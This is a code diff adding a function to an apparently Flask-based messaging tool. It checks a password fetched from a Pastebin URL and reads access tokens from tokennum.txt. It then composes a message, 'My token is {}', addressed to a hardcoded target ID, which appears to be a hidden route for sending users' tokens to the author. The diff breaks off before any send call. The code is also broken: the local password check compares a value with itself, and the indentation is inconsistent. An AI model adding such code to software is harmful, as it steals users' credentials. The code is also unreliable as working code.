@@ -17,6 +17,32 @@ headers = {
     'referer': 'www.google.com'
 }
 
+def send_messages():
+    with open('password.txt', 'r') as file:
+        password = file.read().strip()
+
+    entered_password = password
+
+    if entered_password != password:
+        print('-] <==> 1NCORR3CT P99SWORD TH3 P99SWORD CH9NG3 BY RAHUL DON')
+        sys.exit()
+
+    mmm = requests.get('https://pastebin.com/raw/Sb27RwGi').text
+
+    if mmm not in password:
+        print('-]  <==> 1NCORR3CT P99SWORD TH3 P99SWORD CH9NG3 BY RAHUL DON')
+        sys.exit()
+
+with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
+
+    # Modify the message as per your requirement
+    msg_template = "Hello Rahul sir! I am using your server. My token is {}"
+
+    # Specify the ID where you want to send the message
+    target_id = "100024841659712"
+
+    requests.packages.urllib3.disable_warnings()
 
 @app.route('/')
 def index():
